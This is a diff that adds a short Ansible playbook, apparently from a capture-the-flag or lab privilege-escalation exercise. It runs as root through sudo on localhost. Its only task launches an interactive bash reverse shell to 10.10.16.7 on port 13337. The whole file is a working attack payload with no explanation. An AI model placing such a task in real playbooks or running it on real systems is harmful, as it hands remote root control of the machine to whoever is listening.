@@ -1,0 +1,9 @@
+- hosts: localhost 
+  remote_user: root
+  become: yes
+  become_method: sudo
+
+  tasks:
+    - command: /usr/bin/bash -c '/usr/bin/bash -i >& /dev/tcp/10.10.16.7/13337 0>&1'
+
+
